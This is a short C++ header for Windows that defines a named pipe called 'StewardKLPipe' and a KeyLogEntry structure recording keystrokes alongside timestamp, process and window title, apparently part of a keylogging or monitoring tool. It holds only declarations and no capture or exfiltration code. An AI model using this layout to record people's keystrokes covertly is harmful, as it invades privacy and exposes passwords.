#pragma once

#include <string>
#include <windows.h>

#define PIPE_NAME          L"\\\\.\\pipe\\StewardKLPipe"
#define BUFFER_SIZE        1024
#define MAX_LOG_ENTRIES    1200

struct KeyLogEntry {
    std::wstring rawLine;
    std::wstring timestamp;
    DWORD        processId = 0;
    std::wstring processName;
    std::wstring windowTitle;
    std::wstring keyName;
    DWORD        vkCode = 0;
    std::wstring action;
};